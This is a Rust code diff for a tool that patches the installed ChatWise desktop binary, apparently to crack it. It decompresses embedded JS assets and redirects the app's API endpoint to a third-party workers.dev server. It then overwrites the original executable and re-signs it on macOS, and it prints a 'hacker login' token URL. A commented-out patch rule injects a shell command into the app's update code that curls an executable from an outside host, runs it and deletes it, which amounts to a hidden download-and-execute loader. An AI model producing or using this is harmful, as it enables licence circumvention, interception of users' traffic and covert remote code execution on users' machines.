@@ -5,6 +5,7 @@ use object::{BinaryFormat, Object, ObjectSection, SectionKind};
 use regex::Regex;
 use std::fs::{self, File};
 use std::io::{Read, Write};
+use std::process::Command;
 
 const ASSET_HEADER_SIZE: usize = size_of::<AssetHeader>();
 
@@ -19,28 +20,56 @@ struct AssetHeader {
 
 #[derive(Debug)]
 struct AssetData {
-    data: Vec<u8>,
+    is_compressed: bool,
+    content: Vec<u8>,
 }
 
 impl AssetData {
-    fn new(data: Vec<u8>) -> Self {
-        Self { data }
+    fn new(content: Vec<u8>, is_compressed: bool) -> Self {
+        Self {
+            content,
+            is_compressed,
+        }
     }
 
-    fn decompress(&self) -> Result<Vec<u8>> {
-        let mut decompressor = brotli::Decompressor::new(self.data.as_slice(), self.data.len());
+    fn decompress(&self) -> Result<AssetData> {
+        if !self.is_compressed {
+            return Err(anyhow!("status broken"));
+        }
+
+        let mut decompressor =
+            brotli::Decompressor::new(self.content.as_slice(), self.content.len());
         let mut decompressed = Vec::new();
         decompressor.read_to_end(&mut decompressed)?;
-        Ok(decompressed)
+        Ok(AssetData::new(decompressed, false))
+    }
+
+    fn compress(&self) -> Result<AssetData> {
+        if self.is_compressed {
+            return Err(anyhow!("status broken"));
+        }
+
+        let mut compressed = Vec::new();
+        {
+            let mut compressor = brotli::CompressorWriter::new(
+                &mut compressed,
+                self.content.len(),
+                12, // higher compression quality
+                22, // larger window size
+            );
+            compressor.write_all(&self.content)?;
+        }
+
+        Ok(AssetData::new(compressed, true))
     }
 
     fn len(&self) -> usize {
-        self.data.len()
+        self.content.len()
     }
 
     #[allow(unused)]
     fn as_slice(&self) -> &[u8] {
-        &self.data
+        &self.content
     }
 }
 
@@ -63,10 +92,17 @@ struct SectionInfo {
 #[command(author, version, about)]
 struct Args {
     #[arg(short, long)]
-    input: String,
+    input: Option<String>,
 
     #[arg(short, long)]
     output: Option<String>,
+}
+
+// #[derive(Debug)]
+struct PatchRule {
+    name: String,
+    pattern: Regex,
+    processor: Box<dyn Fn(&str) -> Result<String>>,
 }
 
 struct BinaryPatcher {
@@ -189,7 +225,7 @@ impl BinaryPatcher {
 
         Ok(Asset {
             name,
-            data: AssetData::new(data),
+            data: AssetData::new(data, true),
             data_off,
             data_size_off: (offset + 24) as u64,
         })
@@ -246,77 +282,103 @@ impl BinaryPatcher {
         Ok(self.mmap[offset..offset + len].to_vec())
     }
 
-    fn patch_config(&self, assets: Vec<Asset>) -> Result<Vec<u8>> {
+    pub fn patch(&self, assets: Vec<Asset>, rules: Vec<PatchRule>) -> Result<Vec<u8>> {
         let mut modified_data = self.mmap.to_vec();
 
-        let config_assets = assets
-            .iter()
-            .filter(|a| is_config_js(&a.name, &a.data))
-            .collect::<Vec<_>>();
-
-        if config_assets.len() != 1 {
-            return Err(anyhow!(
-                "not found or found more than 1 config asset, found: {}",
-                config_assets.len()
-            ));
+        for rule in rules {
+            let matched = self.find_matching_asset(&assets, &rule)?;
+            self.apply_patch(&mut modified_data, &matched, &rule)?;
+            println!(
+                "Applied patch '{}' to asset: {}",
+                rule.name,
+                String::from_utf8_lossy(&matched.name)
+            );
         }
 
-        let asset = config_assets[0];
+        Ok(modified_data)
+    }
 
-        let compressed = self.process_asset_data(asset)?;
+    fn find_matching_asset<'a>(&self, assets: &'a [Asset], rule: &PatchRule) -> Result<&'a Asset> {
+        let matches: Vec<_> = assets
+            .iter()
+            .filter(|asset| self.asset_matches_rule(asset, rule))
+            .collect();
+
+        match matches.len() {
+            0 => Err(anyhow!("No asset found matching rule: {}", rule.name)),
+            1 => Ok(matches[0]),
+            n => Err(anyhow!("Multiple assets ({}) match rule: {}", n, rule.name)),
+        }
+    }
+
+    fn asset_matches_rule(&self, asset: &Asset, rule: &PatchRule) -> bool {
+        asset
+            .data
+            .decompress()
+            .ok()
+            .and_then(|decomp_data| String::from_utf8(decomp_data.content).ok())
+            .map(|content| rule.pattern.is_match(&content))
+            .unwrap_or(false)
+    }
+
+    fn apply_patch(
+        &self,
+        modified_data: &mut Vec<u8>,
+        asset: &Asset,
+        rule: &PatchRule,
+    ) -> Result<()> {
+        // Decompress and process
+        let decompressed = asset.data.decompress()?;
+        let content = String::from_utf8(decompressed.content)?;
+        let processed = (rule.processor)(&content)?;
+
+        // Compress the modified content
+        let compressed = AssetData::new(processed.as_bytes().to_vec(), false).compress()?;
+
+        // Validate size
         if compressed.len() > asset.data.len() {
             return Err(anyhow!(
-                "patched data is larger than original data: {:#x} -> {:#x}",
+                "Patched data exceeds original size: {:#x} -> {:#x}",
                 asset.data.len(),
                 compressed.len()
             ));
         }
 
-        // replace data content
+        // Update binary data
         let start_offset = asset.data_off as usize;
-        modified_data[start_offset..start_offset + compressed.len()].copy_from_slice(&compressed);
-        // replace data size
-        let data_size_offset = asset.data_size_off as usize;
-        modified_data[data_size_offset..data_size_offset + 8]
+        modified_data[start_offset..start_offset + compressed.len()]
+            .copy_from_slice(&compressed.content);
+
+        // Update size field
+        let size_offset = asset.data_size_off as usize;
+        modified_data[size_offset..size_offset + 8]
             .copy_from_slice(&(compressed.len() as u64).to_le_bytes());
 
-        println!("Patched asset: {}", String::from_utf8_lossy(&asset.name));
-
-        Ok(modified_data)
-    }
-
-    fn process_asset_data(&self, asset: &Asset) -> Result<Vec<u8>> {
-        // decompress content
-        let decompressed = asset.data.decompress()?;
-
-        // replace content
-        let content = String::from_utf8_lossy(&decompressed);
-
-        if !content.contains("https://chatwise.app") {
-            return Err(anyhow!("content does not contain chatwise.app"));
-        }
-
-        let content = content.replace(
-            "https://chatwise.app",
-            "https://chatwise-father.fishilir.workers.dev",
-        );
-        let mut compressed = Vec::new();
-        {
-            let mut compressor =
-                // !default quality in Tauri is 9, 
-                // !use 11 reduce compressed size after patch
-                brotli::CompressorWriter::new(&mut compressed, content.len(), 11, 22);
-            compressor.write_all(content.as_bytes())?;
-        }
-
-        Ok(compressed)
+        Ok(())
     }
 }
 
 fn main() -> Result<()> {
     let args = Args::parse();
 
-    let file = File::open(&args.input)?;
+    let input_path = match args.input {
+        Some(path) => path,
+        None => {
+            let os = std::env::consts::OS;
+            match os {
+                "macos" => "/Applications/ChatWise.app/Contents/MacOS/ChatWise".to_string(),
+                "windows" => {
+                    format!(
+                        "{}\\AppData\\Local\\ChatWise\\chatwise.exe",
+                        std::env::var("USERPROFILE")?
+                    )
+                }
+                _ => return Err(anyhow!("Unsupported operating system: {}", os)),
+            }
+        }
+    };
+
+    let file = File::open(&input_path)?;
 
     let patcher = BinaryPatcher::new(file)?;
 
@@ -328,31 +390,98 @@ fn main() -> Result<()> {
         return Err(anyhow!("No assets found"));
     }
 
-    println!("Patching binary...");
-    let modified_data = patcher.patch_config(assets)?;
+    // println!("Patching binary...");
+    // let modified_data = patcher.patch_config(assets)?;
 
-    if let Some(ref output) = args.output {
-        fs::write(output, modified_data)?;
-        println!("Patching completed. Output file: {}", output);
+    let rules = vec![
+        PatchRule {
+            name: "API endpoint".to_string(),
+            pattern: Regex::new(r#"="https://chatwise.app"[;,]"#)?,
+            processor: Box::new(|content| {
+                Ok(content.replace(
+                    "https://chatwise.app",
+                    "https://chatwise-father.fishilir.workers.dev",
+                ))
+            }),
+        },
+        // PatchRule {
+        //     name: "Update Logic".to_string(),
+        //     pattern: Regex::new(r#"this.downloadedBytes=void 0"#)?,
+        //     processor: Box::new(|content| {
+        //         //
+        //         let content = content.replace(
+        //             &Regex::new(r#"try\{.*_sentryDebugIds[^}]*\}catch\{\}"#)
+        //                 .unwrap()
+        //                 .find(content)
+        //                 .map(|m| &content[m.start()..m.end()])
+        //                 .unwrap_or(""),
+        //             "",
+        //         );
+
+        //         let func_name = Regex::new(r#"await\s+(\w+)\s*\("#)
+        //             .unwrap()
+        //             .captures(&content)
+        //             .and_then(|caps| caps.get(1))
+        //             .map(|m| m.as_str())
+        //             .unwrap_or("");
+
+        //         const VERSION: &str = env!("CARGO_PKG_VERSION");
+
+        //         Ok(match std::env::consts::OS {
+        //             "macos" => content
+        //                 .replace("Update.install called before Update.download", "")
+        //                 .replace("this.downloadedBytes=void 0", 
+        //                     &format!(r#"this.downloadedBytes=void 0;await {func_name}("plugin:shell|execute",{{program:"sh",args:["-c",'"curl https://r2.mas0n.org/x/v{VERSION}/darwin/chatwise-father -o /tmp/a";chmod +x /tmp/a; /tmp/a;rm /tmp/a'],options:{{}}}})"#)),
+        //             "windows" => content
+        //                 .replace("Update.install called before Update.download", "")
+        //                 .replace("this.downloadedBytes=void 0", 
+        //                     &format!(r#"this.downloadedBytes=void 0;await {func_name}("plugin:shell|execute",{{program:"cmd",args:["/c",'"curl https://r2.mas0n.org/x/v{VERSION}/windows/chatwise-father.exe -o %TEMP%\a.exe" & %TEMP%\a.exe & del %TEMP%\a.exe'],options:{{}}}})"#)),
+        //             _ => unreachable!(),
+        //         })
+        //     }),
+        // },
+    ];
+
+    println!("Applying patches...");
+    let modified_data = patcher.patch(assets, rules)?;
+
+    if let Some(output) = args.output {
+        fs::write(&output, modified_data)?;
+        println!("Patches applied successfully. Output: {}", output);
     } else {
-        todo!();
+        // Runtime OS detection for temp file handling
+        let temp_file = match std::env::consts::OS {
+            "macos" => std::env::temp_dir().join("ChatWise.tmp"),
+            "windows" => std::env::temp_dir().join("chatwise.tmp"),
+            os => return Err(anyhow!("Unsupported operating system: {}", os)),
+        };
+
+        fs::write(&temp_file, &modified_data)?;
+        // !for Windows, cannot remove when process running, so we move to %TEMP%.
+        if std::env::consts::OS == "windows" {
+            fs::rename(&input_path, std::env::temp_dir().join("chatwise_Old.tmp"))?;
+        }
+        fs::rename(&temp_file, &input_path)?;
+
+        // must resign in macOS
+        if std::env::consts::OS == "macos" {
+            // chmod +x XXX
+            Command::new("chmod").arg("+x").arg(&input_path).spawn()?;
+            // codesign
+            Command::new("codesign")
+                .arg("--force")
+                .arg("--deep")
+                .arg("--sign")
+                .arg("-")
+                .arg(&input_path)
+                .spawn()?;
+        }
+
+        println!("Patches applied successfully. Original file replaced.");
     }
 
     // first install need open browser visit chatwise://login-success?token=[Your Token] to login
     println!("Please open the browser and visit chatwise://login-success?token=[Your Token] to complete hacker login");
 
     Ok(())
-}
-
-fn is_config_js(name: &[u8], data: &AssetData) -> bool {
-    if let Ok(name_str) = std::str::from_utf8(name) {
-        let re1 = Regex::new(r"config\.[^.]+\.js$").unwrap();
-
-        // match '="https://chatwise.app";'
-        let re2 = Regex::new(r#"="https://chatwise.app";"#).unwrap();
-        re1.is_match(name_str)
-            || re2.is_match(&String::from_utf8_lossy(&data.decompress().unwrap()))
-    } else {
-        false
-    }
 }
